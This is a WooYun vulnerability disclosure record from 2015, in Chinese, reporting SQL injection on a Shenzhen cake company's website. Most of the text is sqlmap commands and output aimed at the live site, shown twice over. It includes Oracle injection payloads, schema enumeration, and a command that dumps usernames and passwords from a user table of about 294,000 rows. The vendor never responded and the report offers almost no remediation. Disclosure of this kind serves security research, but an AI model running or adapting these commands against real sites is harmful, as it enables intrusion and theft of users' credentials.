{"id": 19311, "wybug_id": "wooyun-2015-0115908", "wybug_title": "美时每客官网存在SQL注入导致大量用户信息泄露", "wybug_corp": "美时每客", "wybug_author": "gentoofly", "wybug_date": "2015-05-25 18:19", "wybug_open_date": "2015-07-09 18:20", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-25：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 美时每客是一家位于深圳的蛋糕厂商，主页十分精美，蛋糕看起来也相当的不错 详细说明：  注入点位于：sqlmap -u \"http://caketime.com.cn/Product/Details.aspx?ID=10937&CategoryId=10076%27\"sqlmap -u \"http://caketime.com.cn/Product/Details.aspx?ID=10937&CategoryId=10076%27\" --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 16:07:35[16:07:35] [WARNING] it appears that you have provided tainted parameter values ('CategoryId=10076'') with most probably leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properlyAre you sure you want to continue? [y/N] y[16:07:37] [INFO] resuming back-end DBMS 'oracle' [16:07:37] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=10937 AND 8973=8973&CategoryId=10076'    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: ID=10937 AND 5784=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(119)||CHR(109)||CHR(105)||CHR(113)||(SELECT (CASE WHEN (5784=5784) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(115)||CHR(99)||CHR(117)||CHR(113)||CHR(62))) FROM DUAL)&CategoryId=10076'    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: ID=10937 AND 8572=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(120)||CHR(85)||CHR(101),5)&CategoryId=10076'---[16:07:38] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Oracle[16:07:38] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[16:07:38] [INFO] fetching database (schema) names[16:07:43] [INFO] the SQL query used returns 19 entries[16:07:44] [INFO] retrieved: APEX_030200[16:07:44] [INFO] retrieved: APPQOSSYS[16:07:45] [INFO] retrieved: CTXSYS[16:07:45] [INFO] retrieved: DBSNMP[16:07:46] [INFO] retrieved: EXFSYS[16:07:47] [INFO] retrieved: FLOWS_FILES[16:07:47] [INFO] retrieved: MDSYS[16:07:48] [INFO] retrieved: OLAPSYS[16:07:49] [INFO] retrieved: ORDDATA[16:07:49] [INFO] retrieved: ORDERS2010[16:07:50] [INFO] retrieved: ORDSYS[16:07:51] [INFO] retrieved: OUTLN[16:07:51] [INFO] retrieved: OWBSYS[16:07:52] [INFO] retrieved: SCOTT[16:07:53] [INFO] retrieved: SYS[16:07:54] [INFO] retrieved: SYSMAN[16:07:55] [INFO] retrieved: SYSTEM[16:07:56] [INFO] retrieved: WMSYS[16:07:57] [INFO] retrieved: XDBavailable databases [19]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EXFSYS[*] FLOWS_FILES[*] MDSYS[*] OLAPSYS[*] ORDDATA[*] ORDERS2010[*] ORDSYS[*] OUTLN[*] OWBSYS[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] WMSYS[*] XDB[16:07:57] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 20 times[16:07:57] [WARNING] it appears that the target has a maximum connections constraint[16:07:57] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/caketime.com.cn'[*] shutting down at 16:07:57sqlmap -u \"http://caketime.com.cn/Product/Details.aspx?ID=10937&CategoryId=10076%27\" -D \"ORDERS2010\" -T \"O_USER\" --dump -C \"NAME,PWD\"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 16:26:15[16:26:15] [WARNING] it appears that you have provided tainted parameter values ('CategoryId=10076'') with most probably leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properlyAre you sure you want to continue? [y/N] y[16:26:17] [INFO] resuming back-end DBMS 'oracle' [16:26:17] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=10937 AND 8973=8973&CategoryId=10076'    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: ID=10937 AND 5784=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(119)||CHR(109)||CHR(105)||CHR(113)||(SELECT (CASE WHEN (5784=5784) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(115)||CHR(99)||CHR(117)||CHR(113)||CHR(62))) FROM DUAL)&CategoryId=10076'    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: ID=10937 AND 8572=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(120)||CHR(85)||CHR(101),5)&CategoryId=10076'---[16:26:19] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Oracle[16:26:19] [INFO] fetching columns 'NAME, PWD' for table 'O_USER' in database 'ORDERS2010'[16:26:19] [INFO] the SQL query used returns 2 entries[16:26:19] [INFO] retrieved: NAME[16:26:19] [INFO] retrieved: NVARCHAR2[16:26:20] [INFO] retrieved: PWD[16:26:20] [INFO] retrieved: NVARCHAR2[16:26:20] [INFO] fetching entries of column(s) 'NAME, PWD' for table 'O_USER' in database 'ORDERS2010'[16:26:20] [INFO] the SQL query used returns 294060 entries 294060 entries---------------------提交漏洞不容易，之前已经提交过好几个了，都没有通过，这次这个漏洞希望能够通过，顺便给个邀请码，呵呵。   漏洞证明：  注入点位于：sqlmap -u \"http://caketime.com.cn/Product/Details.aspx?ID=10937&CategoryId=10076%27\"sqlmap -u \"http://caketime.com.cn/Product/Details.aspx?ID=10937&CategoryId=10076%27\" --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 16:07:35[16:07:35] [WARNING] it appears that you have provided tainted parameter values ('CategoryId=10076'') with most probably leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properlyAre you sure you want to continue? [y/N] y[16:07:37] [INFO] resuming back-end DBMS 'oracle' [16:07:37] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=10937 AND 8973=8973&CategoryId=10076'    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: ID=10937 AND 5784=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(119)||CHR(109)||CHR(105)||CHR(113)||(SELECT (CASE WHEN (5784=5784) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(115)||CHR(99)||CHR(117)||CHR(113)||CHR(62))) FROM DUAL)&CategoryId=10076'    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: ID=10937 AND 8572=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(120)||CHR(85)||CHR(101),5)&CategoryId=10076'---[16:07:38] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Oracle[16:07:38] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[16:07:38] [INFO] fetching database (schema) names[16:07:43] [INFO] the SQL query used returns 19 entries[16:07:44] [INFO] retrieved: APEX_030200[16:07:44] [INFO] retrieved: APPQOSSYS[16:07:45] [INFO] retrieved: CTXSYS[16:07:45] [INFO] retrieved: DBSNMP[16:07:46] [INFO] retrieved: EXFSYS[16:07:47] [INFO] retrieved: FLOWS_FILES[16:07:47] [INFO] retrieved: MDSYS[16:07:48] [INFO] retrieved: OLAPSYS[16:07:49] [INFO] retrieved: ORDDATA[16:07:49] [INFO] retrieved: ORDERS2010[16:07:50] [INFO] retrieved: ORDSYS[16:07:51] [INFO] retrieved: OUTLN[16:07:51] [INFO] retrieved: OWBSYS[16:07:52] [INFO] retrieved: SCOTT[16:07:53] [INFO] retrieved: SYS[16:07:54] [INFO] retrieved: SYSMAN[16:07:55] [INFO] retrieved: SYSTEM[16:07:56] [INFO] retrieved: WMSYS[16:07:57] [INFO] retrieved: XDBavailable databases [19]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EXFSYS[*] FLOWS_FILES[*] MDSYS[*] OLAPSYS[*] ORDDATA[*] ORDERS2010[*] ORDSYS[*] OUTLN[*] OWBSYS[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] WMSYS[*] XDB[16:07:57] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 20 times[16:07:57] [WARNING] it appears that the target has a maximum connections constraint[16:07:57] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/caketime.com.cn'[*] shutting down at 16:07:57sqlmap -u \"http://caketime.com.cn/Product/Details.aspx?ID=10937&CategoryId=10076%27\" -D \"ORDERS2010\" -T \"O_USER\" --dump -C \"NAME,PWD\"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 16:26:15[16:26:15] [WARNING] it appears that you have provided tainted parameter values ('CategoryId=10076'') with most probably leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properlyAre you sure you want to continue? [y/N] y[16:26:17] [INFO] resuming back-end DBMS 'oracle' [16:26:17] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=10937 AND 8973=8973&CategoryId=10076'    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: ID=10937 AND 5784=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(119)||CHR(109)||CHR(105)||CHR(113)||(SELECT (CASE WHEN (5784=5784) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(115)||CHR(99)||CHR(117)||CHR(113)||CHR(62))) FROM DUAL)&CategoryId=10076'    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: ID=10937 AND 8572=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(120)||CHR(85)||CHR(101),5)&CategoryId=10076'---[16:26:19] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Oracle[16:26:19] [INFO] fetching columns 'NAME, PWD' for table 'O_USER' in database 'ORDERS2010'[16:26:19] [INFO] the SQL query used returns 2 entries[16:26:19] [INFO] retrieved: NAME[16:26:19] [INFO] retrieved: NVARCHAR2[16:26:20] [INFO] retrieved: PWD[16:26:20] [INFO] retrieved: NVARCHAR2[16:26:20] [INFO] fetching entries of column(s) 'NAME, PWD' for table 'O_USER' in database 'ORDERS2010'[16:26:20] [INFO] the SQL query used returns 294060 entries 294060 entries   修复方案：  过滤   版权声明：转载请注明来源 gentoofly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：8 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 8, "Ranks": null}